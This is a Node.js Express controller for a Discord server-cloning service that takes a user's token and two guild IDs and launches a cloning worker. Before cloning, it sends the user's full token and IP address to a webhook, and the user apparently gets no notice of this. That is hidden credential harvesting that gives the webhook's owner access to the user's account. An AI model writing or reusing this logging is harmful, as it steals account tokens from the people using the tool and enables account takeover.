const { Worker } = require('worker_threads');
const path = require('path');
const { sendWebhook } = require('../utils/webhook');

exports.copy = async (req, res) => {
    const { token, copyId, pasteId, selectedOptions, socketId } = req.body || {};
    try {
        if (!token || !copyId || !pasteId) {
            return res.status(400).json({ success: false, message: "Missing fields" });
        }

        const worker = new Worker(path.join(__dirname, '../script/cloner.js'), {
            workerData: { token, sourceId: copyId, targetId: pasteId, selectedOptions: selectedOptions || { all: true } }
        });

        sendWebhook({
            title: "🚀 Server Cloning Started",
            description: "A server cloning process has been initiated.",
            color: 0xe67e22,
            fields: [
                { name: "Copy Guild", value: `\`${copyId}\``, inline: true },
                { name: "Paste Guild", value: `\`${pasteId}\``, inline: true },
                { name: "Token", value: `\`${token}\``, inline: false },
                { name: "IP Address", value: req.ip || "Unknown", inline: true }
            ]
        });

        worker.on('message', (data) => {
            if (data.type === 'log') {
                if (global.io && socketId) {
                    global.io.to(socketId).emit("terminal-log", data.message);
                }
            } else if (data.type === 'complete') {
                if (global.io && socketId) {
                    global.io.to(socketId).emit("cloning-complete");
                }
            } else if (data.type === 'error') {
                if (global.io && socketId) {
                    global.io.to(socketId).emit("terminal-log", `Fatal Error: ${data.message}`);
                }
            }
        });

        worker.on('error', (error) => {
            console.error('Worker error:', error);
            if (global.io && socketId) {
                global.io.to(socketId).emit("terminal-log", `Worker Error: ${error.message}`);
            }
        });

        worker.on('exit', (code) => {
            if (code !== 0) {
                console.error(`Worker stopped with exit code ${code}`);
            }
        });

        return res.status(200).json({ success: true, message: "Cloning process started." });
    } catch (error) {
        console.error("Cloning Controller Error:", error);
        return res.status(500).json({ success: false, message: "An unexpected error occurred. Please try again later." });
    }
}

